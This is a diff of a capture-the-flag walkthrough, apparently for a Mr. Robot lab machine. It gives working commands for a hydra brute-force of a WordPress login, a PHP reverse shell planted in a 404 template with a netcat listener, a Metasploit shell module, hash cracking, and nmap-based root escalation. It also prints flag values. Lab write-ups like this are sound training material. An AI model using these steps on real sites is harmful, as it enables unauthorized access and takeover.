@@ -150,90 +150,158 @@ USERNAME IS ELLIOT
 
 
 Option 1:
-hydra -l elliot -P [sorted_fsociety.dic]  [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=is incorrect'
-	-l elliot, lower case to indicate exact user
-	-P password file
-	http-post-form, because it shown on burp as a post form
-	/wp-login.php, post form location
-	log and pass set as -L and -p, log and pass can be found on the burp 
-		interception as being identifiers
-	F=is incorrect sets fail point that is referenced in the error message when a wrong password is entered	
+
+		hydra -l elliot -P [sorted_fsociety.dic]  [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=is incorrect'
+
+-l elliot, lower case to indicate exact user
+
+-P password file
+
+http-post-form, because it shown on burp as a post form
+
+/wp-login.php, post form location
+
+log and pass set as -L and -p, log and pass can be found on the burp 
+
+interception as being identifiers
+
+F=is incorrect sets fail point that is referenced in the error message when a wrong password is entered	
+
+
 Option 2:
-wpscan -u elliot -P [sorted_fsociet.dic]
-	-u sets user as elliot, and -P sets password lists. syntax is easier, but enumeration on user id's is limited, so you must have a user id if unique user. It will check against admin etc. wpscan
+
+		wpscan -u elliot -P [sorted_fsociet.dic]
+
+-u sets user as elliot, and -P sets password lists. syntax is easier, but enumeration on user id's is limited, so you must have a user id if unique user. It will check against admin etc. wpscan
+
 
 [wp-username] = elliot 
 [wp-pasword] = ER28-0652
 
+
 Now we can log into wordpress. 
 
-Forward Facing Application Leverage and generate damion shell:
-Option #1
-Log into wordpress application
-Applications>edit>Edit 404 page template
-Reverse Shell on the 404 page
-	php reverse shell code: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-	php reverse shell, changed [attacker-ipaddress]/[port]
 
-nc -lvnp 443
-	net cat -listen, verbose, skip dns lookup, port [port]
+Forward Facing Application Leverage and generate damion shell:
+
+Option #1
+
+Log into wordpress application
+
+Applications>edit>Edit 404 page template
+
+Reverse Shell on the 404 page
+
+php reverse shell code: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+php reverse shell, changed [attacker-ipaddress]/[port]
+
+		nc -lvnp 443
+
+net cat -listen, verbose, skip dns lookup, port [port]
 
 Go back to the website, and place an incorrect url to trigger the 404 page, which in turns activates the reverse shell. 
+
 WE ARE IN THE TERMINAL 
+
 now in bin/sh$
 
 Option #2
+
 metasploit
-	msfconsole
-	search wordpress shell
-	use 1
-	show options
-	set username [wp-username]
-	set password  [wp-password]
-	set rhost [targetip]
-	exploit
-	ERROR
-	advanced options
-	set wpcheck false
-	exploit
-	shell 
+		msfconsole
+		
+		search wordpress shell
+		
+		use 1
+		
+		show options
+		
+		set username [wp-username]
+		
+		set password  [wp-password]
+		
+		set rhost [targetip]
+		
+		exploit
+
+ERROR
+		
+		advanced options
+	
+		set wpcheck false
+		
+		exploit
+		
+		shell 
 
 gain terminal access
-whoami
-group id
-pwd
-ls
-cd /home 
-ls
-cd /robot
-ls
+
+		whoami
+		
+		pwd
+		
+		ls
+		
+		cd /home 
+		
+		ls
+		
+		cd /robot
+		
+		ls
+
 
 SECOND FLAG FOUND [flag]/ username:[password ] but it's md5 encrypted
-	cracked hash website (crack station) has it cracked and listed as [abcdefghijklmnopqestuvwxyz]
+	
+cracked hash website (crack station) has it cracked and listed as [abcdefghijklmnopqestuvwxyz]
 
 switch to robot user
-su robot, you get an error stating you need to be in a terminal
+
+		su robot
+
+you get an error stating you need to be in a terminal
+
 
 Lateral Movement, New Shell, New User Owned:
 
-python -c 'import pty;pty.spawn("/bin/bash")'
+		python -c 'import pty;pty.spawn("/bin/bash")'
+
 spawns a terminal
-su robot with the password [abcdefghijklmnopqestuvwxyz]
-cd /robots
-ls
-cat key-2-of-3.txt = 822c73956184f694993bede3eb39f959
-find / -perm -4000 -type f 2>/dev/null
-	finds files that being ran by their owner
-nmap --version
+
+		su robot
+		
+with the password [abcdefghijklmnopqestuvwxyz]
+
+		cd /robots
+		
+		ls
+		
+		cat key-2-of-3.txt = 822c73956184f694993bede3eb39f959
+		
+		find / -perm -4000 -type f 2>/dev/null
+
+finds files that being ran by their owner
+
+		nmap --version
+
 research time -- it's vulnerable! 
 
 Root escallation: 
 
-nmap --interactive
-nmap !sudo /bin/bash
-exit
-nmap !sh
-cd /root
-ls
-cat key-3-of-3.txt
+
+		nmap --interactive
+
+		nmap !sudo /bin/bash
+
+		exit
+
+		nmap !sh
+
+		cd /root
+
+		ls
+
+		cat key-3-of-3.txt
+
 04787ddef27c3dee1ee161b21670b4e4
